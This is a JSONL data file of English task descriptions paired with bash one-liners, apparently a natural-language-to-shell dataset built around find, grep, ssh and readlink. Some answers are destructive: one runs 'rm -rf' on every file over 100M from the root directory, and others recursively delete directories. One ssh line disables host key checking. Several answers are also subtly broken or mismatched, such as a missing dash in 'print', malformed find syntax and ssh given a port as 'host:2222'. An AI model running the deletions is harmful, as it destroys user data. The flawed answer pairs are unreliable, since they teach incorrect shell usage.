{"input": "Run an awk program on every TXT file found in the current directory tree", "answer": "find . -name \"*.txt\" -print -exec awk '$9 != \"\" && n < 10 {print; n++}' {} \\;"}
{"input": "Run checksums recursively from the current directory, and give back the filenames of all identical checksum results", "answer": "find ./ -type f -print0 | xargs -0 -n1 md5sum | sort -k 1,32 | uniq -w 32 -d --all-repeated=separate | sed -e 's/^[0-9a-f]*\\ *//;'"}
{"input": "Run commands \"df -k;uname -a\" on server \"192.168.79.134\"", "answer": "echo \"df -k;uname -a\" | ssh 192.168.79.134"}
{"input": "Run script $2 on remote host $1 using interpreter $INTERPRETER with pseudo-terminal allocation", "answer": "cat $2 | grep -v \"#\" | ssh -t $1 $INTERPRETER"}
{"input": "Run sed command \"s#\\(export\\ PATH=\\\"\\)\\(.*\\)#\\1/home/$(whoami)/bin:~/\\.local/bin:\\2#\" on \"~/.zshrc\" where \"$(whoami)\" is replaced with the current user name", "answer": "sed -i \"s#\\(export\\ PATH=\\\"\\)\\(.*\\)#\\1/home/$(whoami)/bin:~/\\.local/bin:\\2#\" ~/.zshrc"}
{"input": "Run the file command on every regular file under current directory", "answer": "find . -type f -exec file '{}' \\;"}
{"input": "Runs `file' on every file in or below the current directory", "answer": "find . -type f -exec file '{}' \\;"}
{"input": "SSH into \"$NAME\" as user \"${USERNAME}\" using key file \"${KEYDIR}/${KEY}.pem\", automatically add the host to list of known hosts and execute \"${COMMANDS}\"", "answer": "ssh -o \"StrictHostKeyChecking no\" -i ${KEYDIR}/${KEY}.pem ${USERNAME}@$NAME \"${COMMANDS}\""}
{"input": "SSH login in 'middle.example.org' via port 2222 as user 'deviceuser' using a private key file './device_id.pem'", "answer": "ssh -i ./device_id.pem deviceuser@middle.example.org:2222"}
{"input": "SSH using parameters in $@ in master mode in the background without executing any commands and set the ControlPath to \"$MASTERSOCK\"", "answer": "ssh -o ControlPath=\"$MASTERSOCK\" -MNf \"$@\""}
{"input": "SSH with trusted X11 forwarding into \"user@remoteToRemote_IP\" from SSH connection \"user@remote_IP\"", "answer": "ssh -XY -t user@remote_IP 'ssh -XY -t user@remoteToRemote_IP'"}
{"input": "Save \"$N\" number of '.' characters in variable \"myvar\"", "answer": "myvar=`seq 1 $N | sed 's/.*/./' | tr -d '\\n'`"}
{"input": "Save \"something\" into variable \"param\" in ksh", "answer": "echo something | read param"}
{"input": "Save $line line in history", "answer": "history -s \"$line\""}
{"input": "Save 'foo' into variable 'bar' in ksh", "answer": "echo foo | read bar"}
{"input": "Save IP address of your SSH session in variable \"WORKSTATION\"", "answer": "WORKSTATION=`who -m|awk '{print $5}'|sed 's/[()]//g'`"}
{"input": "Save IP addresses of the host name in variable \"ip\"", "answer": "ip=$(hostname -I | awk '{print $1}')"}
{"input": "Save Java home in variable \"JAVA_HOME\"", "answer": "JAVA_HOME=\"$( readlink -f \"$( which java )\" | sed \"s:bin/.*$::\" )\""}
{"input": "Save a comma separated list of all $MY_DIRECTORY/*/ directories to variable 'FOLDER'", "answer": "FOLDERS=`ls -dm $MY_DIRECTORY/*/ | tr -d ' '`"}
{"input": "Save a comma separated list of all directories under current directory tree to variable 'FOLDER'", "answer": "FOLDERS=$(find . -type d -print0 | tr '\\0' ',')"}
{"input": "Save a line of 100 random characters either \".\" or \" \" in variable \"foo\"", "answer": "foo=$(cat /dev/urandom | tr -dc '. ' | fold -w 100 | head -1)"}
{"input": "Save a list of all 755 permission files/directories under $dir directory tree to the variable 'files'", "answer": "files=\"$(find $dir -perm 755)\""}
{"input": "Save a list of all the files/directories under current directory tree to a file named 'foo'", "answer": "find . -fprint foo"}
{"input": "Save a nginx link to \"/path/to/file\" with the current user and system FQDN host name in variable \"path\"", "answer": "path=\"http://$(whoami).$(hostname -f)/path/to/file\""}
{"input": "Save a random 4 byte unsigned integer from \"/dev/urandom\" to variable \"RAND\"", "answer": "RAND=`od -t uI -N 4 /dev/urandom | awk '{print $2}'`"}
{"input": "Save a space separated list of process ids of currently running jobs to variable 'bgxjobs'", "answer": "bgxjobs=\" $(jobs -pr | tr '\\n' ' ')\""}
{"input": "Save a unique list of the currently logged in usernames to variable \"line\"", "answer": "line=$(who | cut -d' ' -f1 | sort -u)"}
{"input": "Save absolute path of \"$path\" that may not exist to variable \"abspath\"", "answer": "abspath=$(readlink -m $path)"}
{"input": "Save absolute path of \"$path\" whose parents exist to variable \"abspath\"", "answer": "abspath=$(readlink -f $path)"}
{"input": "Save absolute path of \"/home/nohsib/dvc/../bop\" in variable \"absolute_path\"", "answer": "absolute_path=$(readlink -m /home/nohsib/dvc/../bop)"}
{"input": "Save absolute path of the script filename in variable \"SCRIPT\"", "answer": "SCRIPT=\"$(readlink --canonicalize-existing \"$0\")\""}
{"input": "Save all directories under the current directory as a comma separated list in variable \"FOLDERS\"", "answer": "FOLDERS=$(find $PWD -type d | paste -d, -s)"}
{"input": "Save all entries that are wrapped around with opening and closing square brackets in file 'FILENAME' to variable 'var'", "answer": "var=`egrep -o '\\[.*\\]' FILENAME | tr -d ][`"}
{"input": "Save count of lines from file $file matching with pattern $filter and not matching with pattern $nfilter in variable 'totalLineCnt'", "answer": "totalLineCnt=$(cat \"$file\" | grep \"$filter\" | grep -v \"$nfilter\" | wc -l | grep -o '^[0-9]\\+');"}
{"input": "Save directory \"../../lib\" relative to the executable \"gcc\" to variable \"libdir\"", "answer": "libdir=$(dirname $(dirname $(which gcc)))/lib"}
{"input": "Save first one of space separated parts of each line in $LOCKFILE file to the 'CURRENT_PID_FROM_LOCKFILE' variable", "answer": "CURRENT_PID_FROM_LOCKFILE=`cat $LOCKFILE | cut -f 1 -d \" \"`"}
{"input": "Save full path of command \"cat\" to variable \"CAT\"", "answer": "CAT=`which cat`"}
{"input": "Save full path of command \"mktemp\" to variable \"MKTEMP\"", "answer": "MKTEMP=`which mktemp`"}
{"input": "Save full path of command \"rm\" to variable \"RM\"", "answer": "RM=`which rm`"}
{"input": "Save full path of command \"tr\" to variable \"TR\"", "answer": "TR=`which tr`"}
{"input": "Save hexadecimal byte 10 in binary file \"file.moi\" to variable \"day\"", "answer": "day=$(od -t x1 --skip-bytes=9 --read-bytes=1 file.moi | head -1 | awk '{print $2}')"}
{"input": "Save hexadecimal byte 9 in binary file \"file.moi\" to variable \"month\"", "answer": "month=$(od -t x1 --skip-bytes=8 --read-bytes=1 file.moi | head -1 | awk '{print $2}')"}
{"input": "Save hexadecimal bytes 7 and 8 in binary file \"file.moi\" to variable \"year\"", "answer": "year=$(od -t x2 --skip-bytes=6 --read-bytes=2 file.moi | head -1 | awk '{print $2}')"}
{"input": "Save in QUEUE_PIDS variable only pid numbers that stored in $NEW_PIDS variable", "answer": "QUEUE_PIDS=$(comm -23 <(echo \"$NEW_PIDS\" | sort -u) <(echo \"$LIMITED_PIDS\" | sort -u) | grep -v '^$')"}
{"input": "Save list of groups which user $line belongs to and not matching pattern \"_unknown|sciences|everyone|netaccounts\" in 'results' variable", "answer": "results=$(groups \"$line\" | tr ' ' '\\n' | egrep -v \"_unknown|sciences|everyone|netaccounts\")"}
{"input": "Save long listing of all files listed in file 'filenames.txt' to 'listing' variable", "answer": "listing=$(ls -l $(cat filenames.txt))"}
{"input": "Save long listing of all running processes in the 'log' file, and save number of process strings that contain 'cntps' in the 'cnt' variable", "answer": "cnt=`ps -ef| tee log | grep \"cntps\"|grep -v \"grep\" | wc -l`"}
{"input": "Save number of lines in '/some/big/file' to 'LINES' variable", "answer": "LINES=$(cat /some/big/file | wc -l)"}
{"input": "Save number of lines with any-cased 'merge' from $COMMIT_EDITMSG file in 'MERGE' variable", "answer": "MERGE=$(cat $COMMIT_EDITMSG|grep -i 'merge'|wc -l)"}
{"input": "Save number of processors in system to 'NP' variable", "answer": "NP=`cat /proc/cpuinfo | grep processor | wc -l`"}
{"input": "Save number of strings with $expression pattern in 'foo.txt' to 'big_lines' variable", "answer": "big_lines=`cat foo.txt | grep -c \"$expression\"`"}
{"input": "Save only the digits in \"$filename\" to variable \"number\"", "answer": "number=$(echo $filename | tr -cd '[[:digit:]]')"}
{"input": "Save small letter short day name of the week to variable 'DayOfWeek'", "answer": "DayOfWeek=`date +%a |tr A-Z a-z`"}
{"input": "Save standard input to variable 'stdin' until the first character encoded as '\\004' is read", "answer": "read -d \"$(echo -e '\\004')\" stdin"}
{"input": "Save system information appended with the current date in 'filename' variable", "answer": "filename=\"$(uname -a)$(date)\""}
{"input": "Save the \"Pictures\" directory in the current user's home directory on the directory stack", "answer": "pushd /home/`whoami`/Pictures"}
{"input": "Save the UTC date represented by time string $sting2 as the seconds since epoch to variable 'FinalDate'", "answer": "FinalDate=$(date -u -d \"$string2\" +\"%s\")"}
{"input": "Save the absolute path of \"$path\" to variable \"full_path\"", "answer": "full_path=`readlink -fn -- $path`"}
{"input": "Save the absolute path of \"$path\" to variable \"fullpath\"", "answer": "fullpath=`readlink -f \"$path\"`"}
{"input": "Save the absolute path of the current script to variable \"SELF\"", "answer": "SELF=$(readlink /proc/$$/fd/255)"}
{"input": "Save the absolute path of the directory of the current script to variable \"DIR\"", "answer": "DIR=$(dirname \"$(readlink -f \\\"$0\\\")\")"}
{"input": "Save the canonical filename of \"$BASH_SOURCE\" in variable \"me\"", "answer": "me=$(readlink --canonicalize --no-newline $BASH_SOURCE)"}
{"input": "Save the canonical filename of the script in variable \"me\"", "answer": "me=$(readlink --canonicalize --no-newline $0)"}
{"input": "Save the canonical path of \"$dir/$file\" in variable \"path\"", "answer": "path=`readlink --canonicalize \"$dir/$file\"`"}
{"input": "Save the canonical path of \"/usr/bin/java\" with \"/bin/java\" removed to variable \"JAVA_HOME\"", "answer": "JAVA_HOME=$(readlink -f /usr/bin/java | sed \"s:/bin/java::\")"}
{"input": "Save the current date to 'DATE' variable", "answer": "DATE=$(echo `date`)"}
{"input": "Save the current date, system host name, and \"$changes\" with newlines removed to variable \"subj\"", "answer": "subj=\"$(date) - $(hostname) - $(echo \"$changes\" | sed \"s/$/,/\" | tr \"\\n\" \" \")\""}
{"input": "Save the current working directory and the directory name of the current script to variable \"DIR\"", "answer": "DIR=`pwd`/`dirname $0`"}
{"input": "Save the date 222 days before today to the variable 'date_222days_before_TodayDay'", "answer": "date_222days_before_TodayDay=$(date --date=\"222 days ago\" +\"%d\")"}
{"input": "Save the day of the year from the time string \"20131220\" to variable 'DATECOMING'", "answer": "DATECOMING=$(echo `date -d \"20131220\" +%j`)"}
{"input": "Save the directory name of the canonical path to the current script in variable \"MY_DIR\"", "answer": "MY_DIR=$(dirname $(readlink -f $0))"}
{"input": "Save the directory name of the current bash script to variable \"path\" if it is found in one of the directories specified by PATH", "answer": "path=\"$( dirname \"$( which \"$0\" )\" )\""}
{"input": "Save the directory of the full path to the current script in variable \"dir\"", "answer": "dir=$(dirname $(readlink -m $BASH_SOURCE))"}
{"input": "Save the first \".\" separated field of the system host name to variable \"HOSTZ\"", "answer": "HOSTZ=$( hostname | cut -d. -f1 )"}
{"input": "Save the first 3 lines output by 'yes' to 'file', and log the rest through 'more' which simply waits for user interaction at each page", "answer": "yes | awk 'FNR<4 {print >>\"file\"; close(\"file\")}  1' | more"}
{"input": "Save the first line of \"$j\" into variable \"k\" in ksh", "answer": "echo $j | read k"}
{"input": "Save the first three octets of the current host's IP address to variable \"local\"", "answer": "local=$(hostname -I | awk '{print $2}' | cut -f1,2,3 -d\".\")"}
{"input": "Save the first three octets of the host name's IP address to variable \"subnet\"", "answer": "subnet=$(hostname -i | cut -d. -f1,2,3)"}
{"input": "Save the first two letters of the system host name to variable \"DC\"", "answer": "DC=`hostname | cut -b1,2`"}
{"input": "Save the first word of the first difference in \".dir_list_2\" compared to \".dir_list_1\" into variable \"extract_dir\"", "answer": "extract_dir=$(diff .dir_list_1 .dir_list_2 | grep '>' | head -1 | cut -d' ' -f2)"}
{"input": "Save the full path of command \"oracle\" to variable \"path\"", "answer": "path=`which oracle`"}
{"input": "Save the full path of command \"~/f\" to variable \"foo\"", "answer": "foo=`which ~/f`"}
{"input": "Save the greater version number of \"$1\" and \"$2\" into variable \"ver\"", "answer": "ver=`echo -ne \"$1\\n$2\" |sort -Vr |head -n1`"}
{"input": "Save the last modified time of file 'file_name' to variable 'STAMP'", "answer": "STAMP=`date -r file_name`"}
{"input": "Save the latest modification time (in format \"%T@ %t\" of any file under \"./$dir\" to variable \"timestamp\"", "answer": "timestamp=$(find ./$dir -type f -printf \"%T@ %t\\\\n\" | sort -nr -k 1,2 | head -n 1)"}
{"input": "Save the line number matching \"}]\" in lines starting with \"item_1\" to \"item_2\" in \"itemlist.json\" to variable \"line_to_be_replaced\"", "answer": "line_to_be_replaced=`cat itemlist.json | nl |  sed -n '/\"item_1\"/,/\"item_2\"/p' | grep -in \"}]\" | awk '{print $2}'`"}
{"input": "Save the list of all .py files under and below the current directory that contain \"something\" in their pathnames to output.txt", "answer": "find . -name '*.py' | tee output.txt | xargs grep 'something'"}
{"input": "Save the logical current working directory to variable \"basedir\"", "answer": "basedir=$(pwd -L)"}
{"input": "Save the md5 sum hash of \"${my_iso_file}\" to variable \"md5\"", "answer": "md5=`md5sum ${my_iso_file} | awk '{ print $1 }'`"}
{"input": "Save the md5 sum of $twofish to variable 'twofish'", "answer": "twofish=`echo -n $twofish | md5sum | tr -d \"  -\"`"}
{"input": "Save the network node hostname append with '-', the current date and '.txt' into variable 'filename'", "answer": "filename=\"$(uname -n)-$(date +%F).txt\""}
{"input": "Save the number of bytes in \"$file\" after decompression into variable \"size\"", "answer": "size=\"$(zcat \"$file\" | wc -c)\""}
{"input": "Save the number of records in the system hostname that contain numbers in variable \"server_id\"", "answer": "server_id=`hostname | tr 'A-Za-z-.' ' ' | tr -d '[[:space:]]' | awk '{print NR}'`"}
{"input": "Save the numerically greater value of \"$kf\" and \"$mp\" into variable \"gv\"", "answer": "gv=$(echo -e $kf'\\n'$mp | sort -t'.' -g | tail -n 1)"}
{"input": "Save the percentage of packets lost of the 5 packets sent to \"$host\" in variable \"packet_loss\"", "answer": "packet_loss=$(ping -c 5 -q $host | grep -oP '\\d+(?=% packet loss)')"}
{"input": "Save the physical current working directory to variable \"END_ABS\"", "answer": "END_ABS=`pwd -P`"}
{"input": "Save the short DNS lookup output of $WORKSTATION to 'WORKSTATION_IP' variable", "answer": "WORKSTATION_IP=`dig +short $WORKSTATION`"}
{"input": "Save the short system host name to variable \"hostname\"", "answer": "hostname=`hostname -s`"}
{"input": "Save the user name in all capitals of the current user to variable \"v\"", "answer": "v=$(whoami | awk '{print toupper($0)}')"}
{"input": "Save the user name in upper case of the current user in variable \"v\"", "answer": "v=$(whoami | tr 'a-z' 'A-Z')"}
{"input": "Saves byte size of $myvar variable value in the 'var2' variable", "answer": "var2=$(echo $myvar | wc -c)"}
{"input": "Saves byte size of all content of $1 folder in 'uiTotalSize' variable", "answer": "uiTotalSize=$(ls -l -R $1 | grep -v ^d | awk '{total+=$5;} END {print total;}')"}
{"input": "Saves bytes count of the value of '$each' variable", "answer": "a=$(echo $each | wc -c)"}
{"input": "Saves calendar of $month, $year in the 'cal' variable", "answer": "cal=$(echo $(cal \"$month\" \"$year\"))"}
{"input": "Saves date of the first Sunday in month $mo of year $yo in the 'do' variable", "answer": "do=$(cal -m $mo $yo|awk 'NR>2&&!/^  /{print$1;exit}')"}
{"input": "Saves exit statuses of piped commands in a system variable PIPESTATUS='([0]=\"0\" [1]=\"0\" [2]=\"1\" [3]=\"0\" [4]=\"1\")'", "answer": "true | true | false | true | false"}
{"input": "Saves exit statuses of piped commands in a system variable PIPESTATUS='([0]=\"0\" [1]=\"1\" [2]=\"0\")'", "answer": "true | false | true"}
{"input": "Saves exit statuses of piped commands in a system variable PIPESTATUS='([0]=\"1\" [1]=\"2\")", "answer": "false | true"}
{"input": "Saves file sctipt.sh size in 'size' variable", "answer": "size=`cat script.sh | wc -c`"}
{"input": "Saves folder path where target of symbolic link $file file is located in 'base' variable", "answer": "base=$(dirname $(readlink $file))"}
{"input": "Saves hostname that matches ${ip_address} in 'host' variable, without trailing dot", "answer": "host=$(dig +short -x \"${ip_address}\" | sed 's/\\.$//g')"}
{"input": "Saves in 'result' variable list of groups which user $line belongs to, and not matching pattern \"_unknown|sciences|everyone|netaccounts\"", "answer": "result=$(groups \"$line\" | sed 's/ /\\n/g' | egrep -v \"_unknown|sciences|everyone|netaccounts\")"}
{"input": "Saves index number of file 'script.sh' in the 'inode' variable", "answer": "inode=`ls -i ./script.sh | cut -d\" \" -f1`"}
{"input": "Saves invoked command 'check_script_call=$(history |tail -1|grep myscript.sh )' in variable 'check_script_call', preceeding by its number in history", "answer": "check_script_call=$(history |tail -1|grep myscript.sh )"}
{"input": "Saves list of logged in users in system together with 'USER' header in the 'a' variable", "answer": "a=`w|cut -d' ' -f1`;"}
{"input": "Saves list of logged in users in system together with 'USER' header in the 'b' variable", "answer": "b=`w|cut -d' ' -f1`;"}
{"input": "Saves location of file $1 in 'dir_context' variable", "answer": "dir_context=$(dirname -- \"$1\")"}
{"input": "Saves logged in users names in 'tmp' variable", "answer": "tmp=$(w | awk '{print $1}')"}
{"input": "Saves number of lines of current directory listing in 'n_max' variable", "answer": "n_max=`ls . | wc -l`"}
{"input": "Saves path to the $SCRIPT file in the SCRIPTPATH variable", "answer": "set SCRIPTPATH=`dirname \"$SCRIPT\"`"}
{"input": "Saves printed calendar for $month, $year in positional variables", "answer": "set `cal $month $year`"}
{"input": "Saves printed calendar of February,1900 in positional variables", "answer": "set -- $(cal 2 1900)"}
{"input": "Saves real path of the folder containing the current script", "answer": "DIR=$(dirname \"$(readlink -f \\\"$0\\\")\")"}
{"input": "Saves space separated content of $RAW_LOG_DIR in FILES variable", "answer": "FILES=`cat $RAW_LOG_DIR | xargs -r`"}
{"input": "Saves value '1' in the $PIPESTATUS variable and returns 0", "answer": "false | tee /dev/null"}
{"input": "Scan every file in /etc for IPV4 addresses while trying to elminate false positives", "answer": "find /etc -type f -exec cat '{}' \\; | tr -c '.[:digit:]' '\\n' | grep '^[^.][^.]*\\.[^.][^.]*\\.[^.][^.]*\\.[^.][^.]*$'"}
{"input": "Scan every file in /etc for IPV4 addresses", "answer": "find /etc -exec grep '[0-9][0-9]*[.][0-9][0-9]*[.][0-9][0-9]*[.][0-9][0-9]*' {} \\;"}
{"input": "Search  all files & directoy from root directory which  are greater then 100M and delete them ", "answer": "find /  -size +100M -exec rm -rf {} \\;"}
{"input": "Search  in current directory downwards all files which  have not been accessed since last 7 days", "answer": "find . -atime +7 -print"}
{"input": "Search  in current directory downwards all files whose size is 10 blocks ", "answer": "find .  -size 10 print"}
{"input": "Search \"input.txt\" for regex patterns only matching those listed in \"ignore.txt\", list the unique lines and prefix with the number of occurrences", "answer": "grep -of ignore.txt input.txt | sort | uniq -c"}
{"input": "Search \"inputfile\" for lines starting with \"t:\" and group the results in files with at most 200 lines each", "answer": "cat inputfile | grep \"^t\\:\" | split -l 200"}
{"input": "Search \"mygzfile.gz\" for \"string to be searched\"", "answer": "gunzip -c mygzfile.gz | grep \"string to be searched\""}
{"input": "Search $MYGROUP in /etc/group, take the 4th colon (':') separated field, replace comma (',') with newline and save the result to variable 'MYUSERS'", "answer": "MYUSERS=`grep $MYGROUP /etc/group | cut -d \":\" -f4| tr \",\" \"\\n\"`"}
{"input": "Search *.txt files under and below /directory/containing/files for \"pattern_to_search\"", "answer": "find /directory/containing/files -type f -name \"*.txt\" -exec grep -H 'pattern_to_search' {} +"}
{"input": "Search *.x files from the current directory tree for string \"fred\"", "answer": "find . -name '*.x' -print0 | xargs -0 grep fred"}
{"input": "Search .c and .h files in the current directory tree for \"expr\"", "answer": "find . -name '*.[ch]' | xargs grep -E 'expr'"}
{"input": "Search /dev/shm and /tmp for regular files not changed in two weeks", "answer": "find /dev/shm /tmp -type f -ctime +14"}
{"input": "Search /etc for files modified within the last day", "answer": "find /etc -type f -ctime -1"}
{"input": "Search /some/directory for files that are owned by the user \"joebob\"", "answer": "find /some/directory -user joebob -print"}
{"input": "Search /usr/local for subdirectories whose names end with a number 0-9", "answer": "find /usr/local -maxdepth 1 -type d -name '*[0-9]'"}
{"input": "Search /usr/src for filenames not ending in \"*,v\"", "answer": "find /usr/src ! \\( -name '*,v' -o -name '.*,v' \\) '{}' \\; -print"}
{"input": "Search /var for files matching regular expression '.*/tmp/.*[0-9]*.file'", "answer": "find /var -regex '.*/tmp/.*[0-9]*.file'"}
{"input": "Search PATH for utilities called \"rename\", display the type of file (script, executable, ...) for each match found", "answer": "which -a rename | xargs file -L"}
{"input": "Search all *.c files from the current directory tree for \"hogehoge\"", "answer": "find . -name \\*.c -exec grep hogehoge {} \\;"}
{"input": "Search all *.txt files under ~/documents for the word \"DOGS\"", "answer": "find ~/documents -type f -name '*.txt' -exec grep -s DOGS {} \\; -print"}
{"input": "Search all .c and .h files in the current directory tree for string \"e\"", "answer": "find . -name \"*.[ch]\" -exec grep --color -aHn \"e\" {} \\;"}
{"input": "Search all .c files from the current directory tree for \"keyword\", ignoring the case", "answer": "find . -name \"*.c\" -exec grep -i \"keyword\" {} \";\""}
{"input": "Search all .java files residing in the current directory tree and modified at least 7 days ago for string \"swt\"", "answer": "find . -name '*.java' -mtime +7 -print0 | xargs -0 grep 'swt'"}
{"input": "Search all .py files in the current directory tree for \"some_function\"", "answer": "find . -name \\*.py | xargs grep some_function"}
{"input": "Search all Python files in the current directory tree for string \"import antigravity\"", "answer": "find . -name \"*.py\" | xargs grep 'import antigravity'"}
{"input": "Search all directories starting from the root directory for \"filename\"", "answer": "find / -iname \"filename\""}
{"input": "Search all files and   directories either of the directory /home/oracle and  /home/databse which  contain the \"zip\"  anywhere in the files or directory name ", "answer": "find /home/oracle /home/database -name '*zip*'"}
{"input": "Search all files from the /tmp directory tree for the string \"search string\"", "answer": "find /tmp -type f -exec grep 'search string' '{}' /dev/null \\+"}
{"input": "Search all files in the current directory tree for \"SearchString\", ignoring .html files and skipping .svn directories", "answer": "find . \\( -name '*.svn*' -prune  -o ! -name '*.html' \\) | xargs -d '\\n' grep -Hd skip 'SearchString'"}
{"input": "Search all files in the current directory tree that are named \"whatever\" for \"whatever\"", "answer": "find . -name whatever -print | xargs grep whatever"}
{"input": "Search all files in the current directory tree that are named \"whatever\" for \"you_search_for_it\"", "answer": "find -name whatever -exec grep --with-filename you_search_for_it {} \\;"}
{"input": "Search all files in the current directory tree whose names contain \".\" for \"SearchString\"", "answer": "find . -name '*.*' -exec grep 'SearchString' {} /dev/null \\;"}
{"input": "Search all files in the current directory tree whose names end in \"1\" for string \"1\"", "answer": "find . -name \"*1\" -exec grep \"1\" {} +"}
{"input": "Search all files in the current directory tree, except *.html and *.svn*, for \"SearchString\"", "answer": "find . ! -name '*.html' ! -name '*.svn*' -exec grep 'SearchString' {} /dev/null \\;"}
{"input": "Search all files in the current directory tree, except GIT files, for \"string-to-search\"", "answer": "find . -name .git -prune -o -print | xargs grep \"string-to-search\""}
{"input": "Search all files under and below /etc for IP addresses", "answer": "find /etc -exec grep '[0-9][0-9]*[.][0-9][0-9]*[.][0-9][0-9]*[.][0-9][0-9]*' {} \\;"}
{"input": "Search all non-hidden files in the current directory and all non-hidden sub-directories for the file hi.dat", "answer": "find *-name hi.dat"}
{"input": "Search all of /usr for any directory named 'My Files', for each directory found, copy it to /iscsi preserving full paths and attributes, then remove it", "answer": "find /usr -type d -name 'My Files' -exec rsync -avR '{}' /iscsi \\;  -exec rm -rf '{}'\\;"}
{"input": "Search all of /usr for any directory named 'My Files', for each directory found, copy it to /iscsi preserving full paths and attributes", "answer": "find /usr -type d -name My\\ Files -exec rsync -avR '{}' /iscsi \\;"}
{"input": "Search all regular files in the current directory for \"example\"", "answer": "find -maxdepth 1 -type f | xargs grep -F 'example'"}
{"input": "Search all regular files in the current directory tree for \"example\"", "answer": "find -type f -print0 | xargs -r0 grep -F 'example'"}
{"input": "Search all regular files in the current directory tree for \"string\"", "answer": "find . -type f -exec grep string {} \\;"}
{"input": "Search all the *.pl files in the current directory and subdirectories, and print the names of any that don't have a line starting with 'use strict'", "answer": "find . -name '*.pl' | xargs grep -L '^use strict'"}
{"input": "Search all the .c and .h files in the current directory tree for \"expr\"", "answer": "find -name '*.[ch]' | xargs grep -E 'expr'"}
{"input": "Search all the regular files from the current directory tree for \"search string\"", "answer": "find . -type f -print -exec grep --color=auto --no-messages -nH \"search string\" \"{}\" \\;"}
{"input": "Search all the regular files in the current directory for \"example\"", "answer": "find -maxdepth 1 -type f | xargs grep -F 'example'"}
{"input": "Search all the regular files in the current directory tree for \"example\"", "answer": "find -type f -print0 | xargs -r0 grep -F 'example'"}
{"input": "Search appended data in \"logfile.log\" for \"something\" with a timeout of 3 seconds", "answer": "tail -f logfile.log | grep --line-buffered \"something\" | read -t 3"}
{"input": "Search case insensitively for 'facebook', 'xing', 'linkedin', ''googleplus' in file 'access-log.txt', extract the matched part, sort them and print them by sorting them in asending order of the number of repeated lines", "answer": "grep -ioh \"facebook\\|xing\\|linkedin\\|googleplus\" access-log.txt | sort | uniq -c | sort -n"}
{"input": "Search core files in current direcory and delete ", "answer": "find . -name core -exec rm {} \\;"}
{"input": "Search current directory for any directory named \"config\" and go to first match found", "answer": "cd \"$(find . -name config -type d | sed 1q)\""}
{"input": "Search directories /res/values-en-rUS and /res/xml for XML files", "answer": "find /res/values-en-rUS /res/xml -iname '*.xml'"}
{"input": "Search directories called ' backup ' from /usr directory downwards and print them", "answer": "find /usr -type d -name backup -print"}
{"input": "Search directory $CURR_DIR for regular files that were changed, accessed, or modified $FTIME days ago", "answer": "find ${CURR_DIR} -type f \\( -ctime ${FTIME} -o -atime ${FTIME} -o -mtime ${FTIME} \\) -printf \"./%P\\n\""}
{"input": "Search directory /home/ABCD recursively, starting from one level below, for regular files", "answer": "find /home/ABCD/ -mindepth 1 -type f -print"}
{"input": "Search directory /tmp/foo for files containing \"/tmp/foo/bar\" in their full names", "answer": "find /tmp/foo -path /tmp/foo/bar -print"}
{"input": "Search directory foo for files containing \"/tmp/foo/bar\" in their full names", "answer": "find foo -path /tmp/foo/bar -print"}
{"input": "Search directory foo for files containing \"foo/bar\" in their full names", "answer": "find foo -path foo/bar -print"}
{"input": "Search directory tree /srv/${x} for regular files accessed at least 10080 minutes ago, and remove those files", "answer": "find /srv/${x} -mindepth 1 -type f -not -amin -10080 -exec rm {} \\;"}
{"input": "Search directory tree `MyApp.app' for directories whose name is 'Headers' and delete them", "answer": "find -d MyApp.app -name Headers -type d -exec rm -rf \"{}\" \\;"}
{"input": "Search directory tree `MyApp.app' for directories whose name is 'Headers' and delete them in an optimized way", "answer": "find -d MyApp.app -name Headers -type d -exec rm -rf {} +"}
{"input": "Search directory trees /tmp and /var/tmp for \"testfile.txt\"", "answer": "find /tmp /var/tmp -iname \"testfile.txt\""}
{"input": "Search every directory except the subdirectory excluded_path for a regular file 'myfile'", "answer": "find / -path excluded_path -prune -o -type f -name myfile -print"}
{"input": "Search everywhere for a file called `httpd.conf' that is newer than /etc/apache-perl/httpd.conf", "answer": "find / -name httpd.conf -newer /etc/apache-perl/httpd.conf"}
{"input": "Search everywhere for files changed within the last minute", "answer": "find / -newerct '1 minute ago' -print"}
{"input": "Search everywhere for hidden file `.profile'", "answer": "find / -name .profile"}
{"input": "Search files \"file-containing-can't\" in the current directory tree for the string \"can't\"", "answer": "find . -name \"file-containing-can't\" -exec grep \"can't\" '{}' \\; -print"}
{"input": "Search for \" 000\" in the hex dump of \"file-with-nulls\"", "answer": "od file-with-nulls | grep ' 000'"}
{"input": "Search for \"#define\" in all files in the current directory, excluding backup files *~, *.orig, *.bak", "answer": "find . -maxdepth 1 ! -regex '.*~$' ! -regex '.*\\.orig$' \\     ! -regex '.*\\.bak$' -exec grep --color \"#define\" {} +"}
{"input": "Search for \"1234567890\" in every gzip file modified between 8:00 and 9:00 on 2014-04-30", "answer": "find . -newermt '2014-04-30 08:00:00' -not -newermt '2014-04-30 09:00:00' |xargs gunzip -c | grep 1234567890"}
{"input": "Search for \"CONFIG_64BIT\" in gzip compressed file \"/proc/config.gz\"", "answer": "zcat /proc/config.gz | grep CONFIG_64BIT"}
{"input": "Search for \"LOG\" in jsmith's home directory tree", "answer": "find ~jsmith -exec grep LOG '{}' /dev/null \\; -print"}
{"input": "Search for \"Stock\" in all *.java files from the current directory tree", "answer": "find . -name \"*.java\" | xargs grep \"Stock\""}
{"input": "Search for \"YOURSTRING\" in all files under current directory", "answer": "grep YOURSTRING `find .`"}
{"input": "Search for \"facebook\\|xing\\|linkedin\\|googleplus\" in \"access-log.txt\" and print a count of the unique entries", "answer": "grep -ioh \"facebook\\|xing\\|linkedin\\|googleplus\" access-log.txt | sort | uniq -c | sort -n"}
{"input": "Search for \"foo\" in every file in the current directory and number the output", "answer": "grep foo * | nl"}
{"input": "Search for \"largecalculation\" in all processes owned by the current user", "answer": "ps -u `whoami` | grep largecalculation"}
{"input": "Search for \"pattern\" in \"file\" and join each line by a space", "answer": "cat file | grep pattern | paste -sd' '"}
{"input": "Search for \"pattern\" in \"file\" and separate each line with '\" \"'", "answer": "cat file | grep pattern | paste -sd'~' | sed -e 's/~/\" \"/g'"}
{"input": "Search for \"pattern\" in all the .c files in the current directory tree", "answer": "find . -name \"*.c\" | xargs grep pattern"}
{"input": "Search for \"search term\" in a sorted list of all files under current directory", "answer": "find . | awk '{FS = \"/\" ; print \"\", NF, $F}' | sort -n  | awk '{print $2}' | xargs grep -d skip \"search term\""}
{"input": "Search for \"vid=123\" in all compressed files found under \"/my_home\" matching \"*log.20140226*\"", "answer": "zcat `find /my_home -name '*log.20140226*'`|grep 'vid=123'"}
{"input": "Search for \"whatever\" in all files under /dir directory ensuring white space safety in filenames", "answer": "find /dir -type f -print0 | xargs -0i cat {} | grep whatever"}
